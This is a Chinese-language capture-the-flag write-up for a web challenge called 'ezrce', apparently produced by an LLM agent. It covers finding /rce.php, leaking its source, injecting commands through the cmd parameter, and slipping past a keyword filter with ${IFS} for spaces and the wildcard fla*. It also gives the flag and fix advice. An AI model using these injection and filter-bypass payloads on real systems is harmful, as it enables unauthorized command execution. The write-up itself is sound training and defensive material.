# ezrce · 渗透记录

## 2.1 基本信息
| 字段 | 内容 |
|---|---|
| 题目 | ezrce |
| 类型 | Web / RCE（命令注入 + WAF 绕过） |
| 入口 | http://d4u7tc77soq2scmf.neu-nex.fun/ |
| 耗时 | 0 日 0 时 2 分 40 秒 |
| LLM | deepseek-flash |
| flag | `nex{no_5PACe_Rc3_gtppqtju}` |

## 2.2 目标与授权
- 授权范围：题目域名，仅 80 端口；仅执行 id/ls/cat，未做持久化
- 禁止动作：DoS、横向移动、持久化、读取无关数据

## 2.3 侦察与指纹
首页 200 但内容近似空白诱导；目录爆破到 /rce.php（highlight_file 源码泄露）

## 2.4 攻击面
1) /（空白诱导）2) /rce.php?cmd=（system 执行点）

## 2.5 漏洞判定
- 类型：Web / RCE（命令注入 + WAF 绕过）
- 位置：/rce.php?cmd=
- 证据：evidence/step2_rce_source.html（WAF 正则）；evidence/step5_flag.txt 第 1 行
- 误报排除：id 回显 uid=33(www-data) 确认执行；直接 cmd=cat /flag 返回 WAF，证明过滤生效

## 2.6 利用链
```
GET /rce.php                      -> 源码泄露：preg_match("/flag| /") + system($cmd)
GET /rce.php?cmd=id               -> uid=33(www-data)
GET /rce.php?cmd=ls${IFS}/        -> 根目录存在 /flag
GET /rce.php?cmd=cat${IFS}/fla*   -> nex{no_5PACe_Rc3_gtppqtju}
绕过分两处：空格=${IFS}，flag 关键字=通配符 fla*
```

## 2.7 影响
命令执行（www-data），可读容器内文件，取得 flag

## 2.8 修复建议
禁止把用户输入拼进 system；用白名单参数化；关闭 highlight_file 源码回显；WAF 不能只做关键字黑名单（通配符/变量替换可绕）

## 2.9 复盘
首页空白诱导，目录爆破得 rce.php；空格用 ${IFS}、flag 用通配符，两步绕过
